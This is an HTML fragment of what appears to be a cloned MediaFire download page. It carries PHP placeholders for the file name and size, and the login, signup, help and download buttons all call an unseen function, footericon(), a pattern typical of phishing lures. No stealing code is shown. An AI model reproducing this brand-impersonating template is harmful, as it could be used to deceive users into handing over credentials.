3)<<4|t>>4;t=(t&15)<<2|h>>6;h&=63;f||(h=64,e||(t=64));c.push(b[k],b[n],b[t]||"",b[h]||"")}return c.join("")};try{return JSON.stringify(this.a&&this.a,S)}finally{Uint8Array.prototype.toJSON=a}}:function(){return JSON.stringify(this.a&&this.a,S)};var S=function(a,b){return"number"!==typeof b||!isNaN(b)&&Infinity!==b&&-Infinity!==b?b:String(b)};M.prototype.toString=function(){return this.a.toString()};var T=function(a){O(this,a)};u(T,M);var U=function(a){O(this,a)};u(U,M);var ja=function(a,b){this.c=new B(a);var c=R(b,T,5);c=new y(w,Q(c,4)||"");this.b=new ea(a,c,Q(b,4));this.a=b},ka=function(a,b,c,d){b=new T(b?JSON.parse(b):null);b=new y(w,Q(b,4)||"");C(a.c,b,3,!1,c,function(){ia(function(){F(a.b);d(!1)},function(){d(!0)},Q(a.a,2),Q(a.a,3),Q(a.a,1))})};var la=function(a,b){V(a,"internal_api_load_with_sb",function(c,d,e){ka(b,c,d,e)});V(a,"internal_api_sb",function(){F(b.b)})},V=function(a,b,c){a=l.btoa(a+b);v(a,c)},W=function(a,b,c){for(var d=[],e=2;e<arguments.length;++e)d[e-2]=arguments[e];e=l.btoa(a+b);e=l[e];if("function"==r(e))e.apply(null,d);else throw Error("API not exported.");};var X=function(a){O(this,a)};u(X,M);var Y=function(a){this.h=window;this.a=a;this.b=Q(this.a,1);this.f=R(this.a,T,2);this.g=R(this.a,U,3);this.c=!1};Y.prototype.start=function(){ma();var a=new ja(this.h.document,this.g);la(this.b,a);na(this)};
var ma=function(){var a=function(){if(!l.frames.googlefcPresent)if(document.body){var b=document.createElement("iframe");b.style.display="none";b.style.width="0px";b.style.height="0px";b.style.border="none";b.style.zIndex="-1000";b.style.left="-1000px";b.style.top="-1000px";b.name="googlefcPresent";document.body.appendChild(b)}else l.setTimeout(a,5)};a()},na=function(a){var b=Date.now();W(a.b,"internal_api_load_with_sb",a.f.h(),function(){var c;var d=a.b,e=l[l.btoa(d+"loader_js")];if(e){e=l.atob(e);
e=parseInt(e,10);d=l.btoa(d+"loader_js").split(".");var f=l;d[0]in f||"undefined"==typeof f.execScript||f.execScript("var "+d[0]);for(;d.length&&(c=d.shift());)d.length?f[c]&&f[c]!==Object.prototype[c]?f=f[c]:f=f[c]={}:f[c]=null;c=Math.abs(b-e);c=1728E5>c?0:c}else c=-1;0!=c&&(W(a.b,"internal_api_sb"),Z(a,Q(a.a,6)))},function(c){Z(a,c?Q(a.a,4):Q(a.a,5))})},Z=function(a,b){a.c||(a.c=!0,a=new l.XMLHttpRequest,a.open("GET",b,!0),a.send())};(function(a,b){l[a]=function(c){for(var d=[],e=0;e<arguments.length;++e)d[e-0]=arguments[e];l[a]=q;b.apply(null,d)}})("__d3lUW8vwsKlB__",function(a){"function"==typeof window.atob&&(a=window.atob(a),a=new X(a?JSON.parse(a):null),(new Y(a)).start())});}).call(this);

window.__d3lUW8vwsKlB__("WyI3MDZmNDc5MDE0NjQyOTlhIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2YvQUdTS1d4WHJqdEVINk9zSUVhMWVNeEpOckpUVjE4bFA1WEtHS01KaTVySTEzSWxzR3BjczV5VC0waGswd0p1enBrYUtGdkgxNHJ0VVJ2MGRhM3duSkNmaGtwOFx1MDAzZCJdCixbMjAsImRpdi1ncHQtYWQiLDEwMCwiTnpBMlpqUTNPVEF4TkRZME1qazVZUVx1MDAzZFx1MDAzZCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL3d3dy5nc3RhdGljLmNvbS8wZW1uL2YvcC83MDZmNDc5MDE0NjQyOTlhLmpzP3VzcXBcdTAwM2RDQkEiXQpdCiwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vbC9BR1NLV3hVY3V4TTZVZ0tGTkFydGFwSE1OY3ZSNlp0cnlsOUN4M1VDM0NpWktMaVBfNWYxYlRCbVR3ZzRGOGlfMmtaVENKS1NxQWU3dUw4N2FudUN0SmZSP2FiXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2wvQUdTS1d4V1lxNUZLTmZDWXVoNktVTjRKNlVmR0V5UEZWZFhHVl9uNXRhVFB3Y2xYVHNWbGtyTEVCWThWSTJaLXBaUkpNcEV6dmt6RktTU3BkRl8zbTA5Nz9hYlx1MDAzZDJcdTAwMjZzYmZcdTAwM2QxIiwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vbC9BR1NLV3hYeGM4amxDc0dCdUtuR0JROFA4d3FiMS0yWEZ4b3ZFYmFpVWN0ZXA1QUNXYU1fY1B0T0xJQS03cE14aTFTeEJ4NHo0LXhHWERjTTZvY0o5WHVhP3NiZlx1MDAzZDIiXQo=");</script> 
  <script>
  // Make sure that the properties exist on the window.
  window.googlefc = window.googlefc || {};
  window.googlefc.callbackQueue = window.googlefc.callbackQueue || [];

  window.googlefc.controlledMessagingFunction = function(message) {
    // Only supress consent dialog when ads are not shown AND GDPR applies
    if (window.displayAds === false) {
      __tcfapi('getTCData', 0, (data, success) => {
       	if (success && data.gdprApplies) {
       	  message.proceed(false);
       	} else {
          message.proceed(true);
       	}
      });
    } else {
      message.proceed(true);
    }
  }

  // Queue the callback on the callbackQueue.
  googlefc.callbackQueue.push({
    'CONSENT_DATA_READY':
    function() {
      __uspapi('getUSPData', 1, (data, success) => {
        if (success) {
          var privacyStringOverride = data.uspString;
          if (navigator.globalPrivacyControl && data.uspString.charAt(2) == 'N') {
            // We have to override google if globalPrivacyControl is set. See also .well-known/gpc.json
            // https://globalprivacycontrol.github.io/gpc-spec/#expressing-a-do-not-sell-or-share-preference
            var oldUspApi = __uspapi;
            privacyStringOverride = data.uspString.substring(0,2) + 'Y' + data.uspString.charAt(3);
            window.__uspapi = function(name, version, callback) {
              if (name == 'getUSPData') {
                callback({"version": 1, "uspString": privacyStringOverride}, true);
              } else {
                oldUspApi(name, version, callback);
              }
            };
          }
          // Loot at override instead of original string so that code above can affect this code
          if (privacyStringOverride.charAt(2) == 'Y') {
            if (getCookie('ccpa_optout_tracked') !== '1') {
              var oXHR = new XMLHttpRequest();
              oXHR.open('POST', '/dynamic/track_ccpa_optout.php', true);
              oXHR.send();
              setCookie('ccpa_optout_tracked', '1', 730);
            }
          }
        }
      });
    }
  });
</script> 
  <script>
            (function() {
                // Constants
                var AD_UNITS_CONFIG = getConfig();
                var BIDDER_ALIASES = getBidderAliases();
                var DISABLED_AD_UNITS = JSON.parse('["div-gpt-ad-1579281193413-0"]');
                var BIDDER_SETTINGS = JSON.parse('[]');
                var PREBID_TIMEOUT = 1000;
                var MAX_RETRIES = 20;
                var LAZY_LOAD_AD_UNIT_MARGIN = 0;

                // Init namespaces
                var googletag = googletag || {};
                var pbjs = pbjs || {};
                googletag.cmd = googletag.cmd || [];
                pbjs.que = pbjs.que || [];
                pbjs.retries = 0;

                // Export
                window.googletag = googletag;
                window.pbjs = pbjs;

                // Disable load until bids arrive
                googletag.cmd.push(function() {
                    googletag.pubads().disableInitialLoad();
                });

                function getConfig() {
                    return JSON.parse('[{"code":"div-gpt-ad-1575674121640-0","sizes":[[320,50],[320,100],[300,100],[300,75]],"mediaTypes":{"banner":{"sizes":[[320,50],[320,100],[300,100],[300,75]]}},"tracking_id":"\/21882844027\/Mobileweb-Ad1-Intl","bids":[{"bidder":"pubmatic","params":{"publisherId":"158936","adSlot":"MediaFire_MobileWeb_Top"}},{"bidder":"sharethrough","params":{"pkey":"hkeT3H47uRjxo6oZMXyxY1z7"},"labelAny":["GEO-AU","GEO-BE","GEO-BR","GEO-CA","GEO-FR","GEO-DE","GEO-IN","GEO-IT","GEO-MY","GEO-MX","GEO-NL","GEO-NZ","GEO-PH","GEO-SG","GEO-ZA","GEO-ES","GEO-CH","GEO-AE","GEO-GB","GEO-US"]},{"bidder":"medianet","params":{"cid":"8CUO2689O","crid":"126221593"}}]},{"code":"div-gpt-ad-1579281108195-0","sizes":[[320,50]],"mediaTypes":{"banner":{"sizes":[[320,50]]}},"tracking_id":"\/21882844027\/Mobileweb-Ad2-Intl","bids":[{"bidder":"pubmatic","params":{"publisherId":"158936","adSlot":"MediaFire_MobileWeb_Bottom"}},{"bidder":"sharethrough","params":{"pkey":"P0NqaGuacHlOQJGBagkC4TFV"},"labelAny":["GEO-AU","GEO-BE","GEO-BR","GEO-CA","GEO-FR","GEO-DE","GEO-IN","GEO-IT","GEO-MY","GEO-MX","GEO-NL","GEO-NZ","GEO-PH","GEO-SG","GEO-ZA","GEO-ES","GEO-CH","GEO-AE","GEO-GB","GEO-US"]},{"bidder":"medianet","params":{"cid":"8CUO2689O","crid":"524626231"}}]},{"code":"div-gpt-ad-1579281193413-0","sizes":[[320,50],[320,100],[300,100],[300,75]],"mediaTypes":{"banner":{"sizes":[[320,50],[320,100],[300,100],[300,75]]}},"tracking_id":"\/21882844027\/Mobileweb-Ad3-Intl","bids":[{"bidder":"pubmatic","params":{"publisherId":"158936","adSlot":"MediaFire_MobileWeb_Ad3"}},{"bidder":"sharethrough","params":{"pkey":"P0NqaGuacHlOQJGBagkC4TFV"},"labelAny":["GEO-AU","GEO-BE","GEO-BR","GEO-CA","GEO-FR","GEO-DE","GEO-IN","GEO-IT","GEO-MY","GEO-MX","GEO-NL","GEO-NZ","GEO-PH","GEO-SG","GEO-ZA","GEO-ES","GEO-CH","GEO-AE","GEO-GB","GEO-US"]},{"bidder":"medianet","params":{"cid":"8CUO2689O","crid":"616778526"}}]}]');
                }

                function getBidderAliases() {
                    return JSON.parse('[]');
                }

                // Bids arrived or timeout reached
                function initAdserver() {
                    if (pbjs.initAdserverSet) return;

                    if (!googletag.pubadsReady && pbjs.retries <= MAX_RETRIES) {
                      setTimeout(initAdserver, 50);
                      pbjs.retries++;
                      return;
                    }

                    pbjs.initAdserverSet = true;

                    googletag.cmd.push(function() {
                        pbjs.que.push(function() {
                            pbjs.setTargetingForGPTAsync();

                            window.setMaxBidTargeting();

                            // Load ad units except disabled ones
                            AD_UNITS_CONFIG.forEach(function(ad) {
                                if (DISABLED_AD_UNITS.includes(ad.code))
                                    return;
                                window.refreshSlot(ad.code);
                            });
                        });
                    });
                }

                // define public method to refresh a slot
                window.refreshSlot = function(code) {
                    googletag.pubads().getSlots().some(function(slot) {
                        if (slot.getSlotElementId() == code) {
                            googletag.pubads().refresh([slot]);
                            return true;
                        }
                    });
                }

                // Find max bids and their bidders for each ad code
                // See https://docs.prebid.org/dev-docs/publisher-api-reference.html
                window.setMaxBidTargeting = function() {
                    var maxBids = [];
                    pbjs.adUnits.forEach(unit=>{
                        var topMaxBid = null;
                        var topMaxBidStr;
                        var topBidder ;
                        pbjs.getBidResponsesForAdUnitCode(unit.code).bids.forEach(bid=>{
                            var fBidValue = parseFloat(bid.pbCg);
                            if (topMaxBid == null || fBidValue > topMaxBid) {
                                topMaxBid = fBidValue;
                                topMaxBidStr = bid.pbCg;
                                topBidder = bid.bidder;
                            }
                        });
                        maxBids[unit.code] = {
                            bidder: topBidder,
                            maxBid: topMaxBidStr
                        };
                    });
                    googletag.pubads().getSlots().map(slot=>{
                        var adCode = slot.getSlotElementId();
                        slot
                            .setTargeting('hb_highestbidder', maxBids[adCode].bidder)
                            .setTargeting('hb_highestbid', maxBids[adCode].maxBid);
                    });
                }

                window['adLazyLoadQueue'] = [];
                var adLoaded = [];

                window.checkAdUnitView = function(code, elementPosition, windowScrollData) {
                    if (adLoaded[code]) {
                        return;
                    }

                    if ((elementPosition.left - LAZY_LOAD_AD_UNIT_MARGIN) < windowScrollData.windowInnerWidth &&
                            (elementPosition.right + LAZY_LOAD_AD_UNIT_MARGIN) > 0 &&
                            (elementPosition.top - LAZY_LOAD_AD_UNIT_MARGIN) < windowScrollData.windowInnerHeight &&
                            (elementPosition.bottom + LAZY_LOAD_AD_UNIT_MARGIN) > 0) {
                        googletag.cmd.push(function () {
                            window.refreshSlot(code);
                            adLoaded[code] = true;
                        });
                    }
                }

                window.checkQueuedAdUnitViews = function(windowScrollData) {
                    var queue = window['adLazyLoadQueue'];
                    if (!queue.length) return;

                    queue.forEach(function(code) {
                        var adElement = document.getElementById(code);
                        if (adElement) {
                            var boundingRect = adElement.getBoundingClientRect();
                            window.checkAdUnitView(code, {
                                left: boundingRect.left - windowScrollData.windowPageXOffset,
                                right: boundingRect.left + boundingRect.width,
                                top: boundingRect.top - windowScrollData.windowPageYOffset,
                                bottom: boundingRect.top + boundingRect.height
                            }, windowScrollData);
                        }
                    });
                }


                // Helper function to load scripts
                function loadScript(src) {
                    var script = document.createElement('script');
                    script.async = true;
                    script.type = 'text/javascript';
                    script.src = src;
                    var node = document.getElementsByTagName('script')[0];
                    node.parentNode.insertBefore(script, node);
                }

                // Timeout if bids take x milliseconds
                setTimeout(initAdserver, PREBID_TIMEOUT);

                // Load Prebid
                /*
                    Version: 5.10.0
                    Bidders:
                        AppNexus
                        OpenX
                        Pubmatic
                        Sharethrough
                    Analytic Adapters:
                    Modules:
                */
                loadScript('/js/prebid5.17.0.js');

                // Setup and request bids
                pbjs.que.push(function() {

                    // For reference:
                    // http://prebid.org/dev-docs/publisher-api-reference.html#module_pbjs.setConfig
                    pbjs.setConfig({
                        debug: false,
                        enableSendAllBids: true,
                        priceGranularity: {
                            buckets: [
                                {
                                    max: 0.05,
                                    increment: 0.01
                                },
                                {
                                    max: 5,
                                    increment: 0.05
                                },
                                {
                                    max: 10,
                                    increment: 0.10
                                },
                                {
                                    max: 20,
                                    increment: 0.50
                                }
                            ]
                        },
                        bidderSequence: 'random',
                        bidderTimeout: PREBID_TIMEOUT,
                        userSync: {
                            filterSettings: {
                                iframe: {
                                    bidders: '*',
                                    filter: 'include'
                                }
                            }
                        }
                        // cache: {url: "https://prebid.adnxs.com/pbc/v1/cache"},
                        // s2sConfig: {
                            // endpoint: "https://prebid.adnxs.com/pbs/v1/openrtb2/auction",
                            // syncEndpoint: "https://prebid.adnxs.com/pbs/v1/cookie_sync",
                        // }
                    });

                    BIDDER_ALIASES.forEach(function(bidderAlias) {
                        pbjs.aliasBidder(bidderAlias.name, bidderAlias.alias);
                    });

                    // Bidder settings
                    for (bidder in BIDDER_SETTINGS) {
                        if (BIDDER_SETTINGS[bidder].bidCpmAdjustment) {
                            pbjs.bidderSettings[bidder] = pbjs.bidderSettings[bidder] || {};
                            pbjs.bidderSettings[bidder].bidCpmAdjustment = (function(bidCpmAdjustment, bidCpm, bid){
                                return bidCpm * bidCpmAdjustment / 100;
                            }).bind(null, BIDDER_SETTINGS[bidder].bidCpmAdjustment);
                        }
                    }

                    pbjs.addAdUnits(AD_UNITS_CONFIG);
                    pbjs.requestBids({
                        bidsBackHandler: initAdserver,
                        labels: ['GEO-ID']
                    });
                });

                // Define and enable ad slots
                googletag.cmd.push(function() {
                    for (var i = 0; i < AD_UNITS_CONFIG.length; i++) {
                        var slot;
                        var ad;
                        try {
                            ad = AD_UNITS_CONFIG[i];
                            slot = googletag.defineSlot(ad.tracking_id, ad.sizes, ad.code);
                            if (slot) {
                                slot.addService(googletag.pubads())
                                    .setTargeting('dkey_present', 'false')
                                    .setTargeting('buildnumber', '121910')
                                    .setTargeting('dladtemplate', '4')
                                    .setTargeting('button_delay', 'disabled');
                            }
                        } catch (e) {
                            console.log('ad failed: ', e, ad, slot);
                        }
                    }
                    try {
                        googletag.pubads().set('page_url', top.location.href);
                    } catch(e) {
                        googletag.pubads().set('page_url', 'https://www.mediafire.com');
                    }
                    googletag.pubads().enableSingleRequest();
                    googletag.enableServices();
                });                // Load Google Services
                loadScript('https://securepubads.g.doubleclick.net/tag/js/gpt.js');            })();
        </script> 
  <script>
        try {
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag("js", new Date());
            gtag("config", "UA-829541-1", {"dimension1":"unregistered","dimension7":"legacy","dimension3":"video","dimension4":"4","dimension5":"mp4","dimension8":"\/20\/50\/100\/"});
        } catch(e) {}
    </script> 
  <script type="text/javascript">
    (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script")
    ;r.type="text/javascript"
    ;r.integrity="sha384-tzcaaCH5+KXD4sGaDozev6oElQhsVfbJvdi3//c2YvbY02LrNlbpGdt3Wq4rWonS"
    ;r.crossOrigin="anonymous";r.async=true
    ;r.src="https://cdn.amplitude.com/libs/amplitude-8.5.0-min.gz.js"
    ;r.onload=function(){if(!e.amplitude.runQueuedFunctions){
    console.log("[Amplitude] Error: could not load SDK")}}
    ;var i=t.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)
    ;function s(e,t){e.prototype[t]=function(){
    this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}
    var o=function(){this._q=[];return this}
    ;var a=["add","append","clearAll","prepend","set","setOnce","unset","preInsert","postInsert","remove"]
    ;for(var c=0;c<a.length;c++){s(o,a[c])}n.Identify=o;var u=function(){this._q=[]
    ;return this}
    ;var l=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"]
    ;for(var p=0;p<l.length;p++){s(u,l[p])}n.Revenue=u
    ;var d=["init","logEvent","logRevenue","setUserId","setUserProperties","setOptOut","setVersionName","setDomain","setDeviceId","enableTracking","setGlobalUserProperties","identify","clearUserProperties","setGroup","logRevenueV2","regenerateDeviceId","groupIdentify","onInit","logEventWithTimestamp","logEventWithGroups","setSessionId","resetSessionId"]
    ;function v(e){function t(t){e[t]=function(){
    e._q.push([t].concat(Array.prototype.slice.call(arguments,0)))}}
    for(var n=0;n<d.length;n++){t(d[n])}}v(n);n.getInstance=function(e){
    e=(!e||e.length===0?"$default_instance":e).toLowerCase()
    ;if(!Object.prototype.hasOwnProperty.call(n._iq,e)){n._iq[e]={_q:[]};v(n._iq[e])
    }return n._iq[e]};e.amplitude=n})(window,document);

    var amp = amplitude.getInstance();
    amp.init('28916b6cd60c79c0447b3c23ad698c98');
    if ('') amp.setUserId('7d8e227e283c6630');
    amp.setUserProperties({group: '1'});
    </script> 
  <!-- Google Tag Manager --> 
  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-53LP4T');</script> 
  <!-- End Google Tag Manager --> 
  <!-- Google Tag Manager (noscript) --> 
  <noscript>
   &lt;iframe src="https://www.googletagmanager.com/ns.html?id=GTM-53LP4T" height="0" width="0" style="display:none;visibility:hidden"&gt;
  </noscript> 
  <!-- End Google Tag Manager (noscript) --> 
  <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.69JJaQ5G5xA.L.W.O/d=0/rs=AN8SPfpC36MIoWPngdVwZ4RUzeJYZaC7rg/m=el_main_css"> 
  <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"> 
 </head> 
 <body class="en defaultTheme" style="position: relative; min-height: 100%; top: 0px;"> 
  <main role="main" class="mf-dlr page ads-mobile4 mobile turbo-dl ads-enabled"> 
   <label for="copy" style="display: none;">Copy textarea</label> 
   <textarea id="copy" style="position:absolute;left:-9999px;opacity:0" aria-hidden="true" tabindex="-1">https</textarea> 
   <div class="content"> 
    <style type="text/css">
.header {
    height: 70px;
    background: #fff;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    z-index: 45;
    box-shadow: 0 1px 0 0 rgba(0, 0, 0, .1);
}

.logo {
    float: left;
    margin: 0;
}

.logo > a {
    display: table;
    height: 70px;
    width: 191px;
    background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/180px auto no-repeat;
    margin: 0 auto;
    text-indent: -9999px;
}

.user-menu {
    float: right;
    margin: 17px 0px 0 0;
    font-family: "open sans";
    font-size: 12px;
}

.user-menu > li {
    float: right;
}

.loginActivateFB,
.loginActivateTW {
    position: absolute;
    top: 50%;
    height: 20px;
    width: 20px;
    border-radius: 2px;
    background-color: rgba(0, 0, 0, .15);
    background-repeat: no-repeat;
    background-position: center;
    background-size: 17px;
    transform: translateY(-50%);
}

.loginActivateFB {
    background-image: url(//static.mediafire.com/images/icons/svg_light/facebook.svg);
    right: 32px;
}

.loginActivateTW {
    background-image: url(//static.mediafire.com/images/icons/svg_light/twitter.svg);
    right: 8px;
}

#login {
    margin-right: 0;
    border-bottom-left-radius: 0;
    border-top-left-radius: 0;
    position: relative;
    padding-right: 67px;
}

#signup {
    margin-right: 1px;
    border-bottom-right-radius: 0;
    border-top-right-radius: 0;
}

.user-menu-help {
    margin-right: 10px;
}

.mobile .user-menu-help {
    display: none;
}

#login,
#signup,
.user-menu-help {
    max-width: 150px;
    white-space: nowrap;
    text-overflow: ellipsis;
    overflow: hidden;
}

/* Media queries
========================================================================== */

@media (max-width: 960px) {
    .logo {
        margin-left: 20px;
    }

    .user-menu {
        margin-right: 17px;
    }
}

@media (max-width: 940px) {
    .loginActivateFB,
    .loginActivateTW {
        display: none;
    }

    #login, #signup {
        width: 85px;
        padding: 0 10px;
    }

    .user-menu-help {
        font-size: 0;
    }

    .user-menu-help .g-Icon--help {
        margin: 0;
    }
}

@media (max-width: 720px) {
    .logo {
        width: 48px;
        overflow: hidden;
    }

    .user-menu-help {
        display: none;
    }
}

@media (max-width: 650px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 150px;
    }
}

@media (max-width: 610px) {
    #goog-header-translate{
        width: 60px;
    }

    #goog-header-translate .goog-te-combo {
        text-indent: 60px;
        padding: 0;
    }
}

@media (max-width: 500px) {
    #login, #signup {
        font-size: 9px;
        padding: 0 5px;
        width: 60px;
    }

    #goog-header-translate {
        width: 36px;
        background-position: center;
    }

    #goog-header-translate .goog-te-combo {
        padding: 0;
        background-image: none !important;
    }
}

@media (max-width: 400px) {
    .logo {
        margin-left: 5px;
    }

    .customLogo .logo {
        margin-left: 0;
    }

    .customLogo .logo,
    .customLogo .logo > a {
        width: 110px;
    }
}

@media (max-width: 340px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 80px;
    }
}
</style> 
    <div class="header"> 
     <div class="u-wrap"> 
      <h1 class="logo"> <a href="#">MediaFire</a> </h1> 
      <ul class="user-menu"> 
       <li> <a onclick="footericon()" id="login" class="g-Btn g-Btn--primary"> <span class="loginActivateTW"></span> <span class="loginActivateFB"></span> Log In </a> </li> 
       <li> <a onclick="footericon()" id="signup" class="g-Btn g-Btn--primary">Sign Up</a> </li> 
       <li> <a onclick="footericon()" class="user-menu-help g-Btn g-Btn--secondary"> <span class="g-Icon g-Icon--help"></span>Help </a> </li> 
       <li class="header-gt-cont">
       <script type="text/javascript">
                  try {
                    function googHeadTranslate() {
                        new google.translate.TranslateElement({
                            pageLanguage: 'en',
                            layout: google.translate.TranslateElement.InlineLayout.VERTICAL,
                            gaTrack: true,
                            gaId: 'UA-829541-1'
                        }, 'goog-header-translate');
                        registerGoogleLang();
                    }
                  } catch(e) {}
                </script> </li> 
      </ul> 
     </div> 
    </div> 
    <div class="center"> 
     <div class="ads dl-box"> 
      <div class="dl-btn-cont"> 
       <div class="icon mp4 video video_mp4"></div> 
       <div class="dl-btn-labelWrap"> 
        <div class="promoDownloadName notranslate"> 
         <div class="dl-btn-label" title="<?php echo $data['video'];?>.mp4">
           <?php echo $data['video'];?> 
         </div> 
        </div> 
        <div class="dl-utility-nav"> 
         <ul> 
          <li> <a href="" target="_blank" rel="noopener" id="shareButton" class="nopop g-Icon g-Icon--white g-Icon--share" aria-labelledby="share-tooltip" title="More sharing options"></a> <span id="share-tooltip" class="alt point-down tooltip"> More sharing options </span> </li> 
          <li> <a href="" target="_blank" rel="noopener" id="copyShareURL" class="nopop g-Icon g-Icon--white g-Icon--link" aria-labelledby="copy-tooltip" title="Copy file link to clipboard"></a> <span id="copy-tooltip" class="alt point-down tooltip"> Copy file link to clipboard </span> </li> 
          <li> <a href="" id="saveButton" class="g-Icon g-Icon--white g-Icon--add" aria-labelledby="save-tooltip" title="Save file to My Files"></a> <span id="save-tooltip" class="alt point-down tooltip"> Save file to My Files </span> </li> 
          <noscript> 
           <style type="text/css">
                            #shareButton, #copyShareURL, #saveButton { display: none }
                        </style> 
          </noscript> 
         </ul> 
        </div> 
       </div> 
       <form method="post" name="download" class="dl-btn-form" autocomplete="off"> 
        <input type="hidden" name="security" value="1689533690.80c0508fc16d4acaeb05dca5907677d613e95ff934a4f5ffb932e6dee8d9f2f5"> 
        <div class="download_link" id="download_link"> 
         <!-- IF THIS IS TRADITIONAL --> 
         <a class="preparing" href="#"><span>Preparing your download...</span></a> 
         <a class="input " aria-label="Download file" onclick="footericon()" target="_download1515" onclick="setTimeout(() => {if (typeof window.InfMediafireMobileFunc === 'function') window.InfMediafireMobileFunc();}, 1000)" id="downloadButton" rel="nofollow"> Download in a new tab (<?php echo $data['ukuran'];?>) </a> 
         <a class="starting" href="#"><span>Your download is starting in a new tab...</span></a> 
         <a class="retry" onclick="footericon()"> <span class="notranslate">Your download started in a new tab.</span> </a> 
         <script type="text/javascript">
     (function() {
         var dl = document.getElementById('download_link');
         if (!dl) return;
         var init = false;

         function retry() {
             dl.className += ' retry';
         };

         function download() {
             dl.className += ' started';
             window.dlStarted = true;
                             setTimeout(retry, 16000);
                      };

         window.initDownload = function() {
             if (init) return;
             init = true;
             dl.className = 'download_link';
             dl.onclick = download;
         };

                  initDownload();
              })();
    </script> 
        </div> 
        <a href="#" class="download_test_link"> Download Diagnostic Tool </a> 
       </form> 
       <div class="TurboDL-toggle-box toggle-off"> 
        <button type="button" class="TurboDL-button" onclick="footericon();"> <span class="turboTDL-toggle"> <span class="turboTDL-toggle-slider"></span> </span> Enable Turbo Downloader <span class="turboTDL-toggle-note"> Beta </span> </button> 
       </div> 
       <div class="DLMobile-shareOptions"> 
        <p> Clicking the download button above will start your download in a new tab and show a message from our advertising partners. </p> 
        <ul> 
         <li> <a onclick="footericon()" id="shareButtonMobile" class="nopop"> <span></span>Share options </a> </li> 
         <li> <a onclick="footericon()" id="saveButtonMobile" class="nopop"> <span></span>Save to My Files </a> </li> 
        </ul> 
       </div> 
      </div> 
      <script type="text/javascript">
    var sticky = {
        threshold: 800,
        div: null,
        init: function() {
            this.div = document.getElementsByClassName('ads-mobile5')[0];
            if (this.div) {
                this.scroll();
                this.events();
            }
        },

        scroll: function() {
            if (this.div) {
                if (window.scrollY > this.threshold) {
                    this.div.classList.add('swapAd');
                } else {
                    this.div.classList.remove('swapAd');
                }
            }
        },

        debounce: function(func, wait, immediate) {
            var timeout;
            return function() {
                var context = this, args = arguments;
                var later = function() {
                    timeout = null;
                    if (!immediate) func.apply(context, args);
                };
                var callNow = immediate && !timeout;
                clearTimeout(timeout);
                timeout = setTimeout(later, wait);
                if (callNow) func.apply(context, args);
            };
        },

        events: function() {
            if (this.div) {
                var debouncedScroll = this.debounce(this.scroll.bind(this), 50);
                window.addEventListener('scroll', debouncedScroll);
            }
        }
    };

    document.addEventListener("DOMContentLoaded", sticky.init.bind(sticky));
</script> 
      <a class="dl-promo-cont nopop" onclick="footericon()" target="_blank" rel="noopener"> MediaFire Pro: Faster bulk downloads, Ad free downloads, &amp; 1 TB of storage. From $3.75/month. </a> 
      <div class="dl-info"> 
       <div class="intro icon mp4 video video_mp4"> 
        <div class="filename">
         <?php echo $data['video'];?>.mp4
        </div> 
        <div class="filetype">
         <span>Video</span>
         <span> (.MP4)<span></span></span>
        </div> 
       </div> 
       <ul class="details"> 
        <li>File size: <span><?php echo $data['ukuran'];?></span></li> 
        <li>Uploaded: <span>2023-05-31 15:41:54</span></li> 
       </ul> 
       <div class="description"> 
        <p class="description-subheading">About Video Formats</p> 
        <p>As with all media formats, video formats run the spectrum between high quality and low file size. Lossless compression for video files attempts to reduce the file size by removing redundancies. Lossy compression schemes reduce filesize by discarding data without the viewer noticing. The Advanced Video Coding (AVC) standard is one of the most commonly used formats for recording, compressing, and distributing high definition video.</p> 
       </div> 
       <div class="sidebar"> 
        <div class="Download-compatibility"> 
         <div style="margin-bottom: 0;"> 
          <div class="filename">
           <?php echo $data['video'];?>.mp4
          </div> 
         </div> 
         <label for="compat-select" style="display: block; margin-bottom: 10px;">System compatibility</label> 
         <select class="g-Select" id="compat-select" title="Select operating system"> <option value="windows" data-compat=""> Windows </option> <option value="osx" data-compat=""> macOS </option> <option value="linux" data-compat=""> Linux </option> </select> 
         <div class="Download-compatibilityStatus is-compatible" id="compat-supported"> 
          <span></span> 
          <p>File is compatible with the selected operating system.</p> 
         </div> 
         <div class="Download-compatibilityStatus is-notCompatible" id="compat-unsupported" style="display:none"> 
          <span></span> 
          <p>File is not compatible with the selected operating system.</p> 
         </div> 
         <script type="text/javascript">
                            var compatSelect = document.getElementById('compat-select');
                            var compat = document.getElementById('compat-supported');
                            var nonCompat = document.getElementById('compat-unsupported');
                            compatSelect.onchange = function(e) {
                                var options = e.target.options;
                                var selection = options[options.selectedIndex];
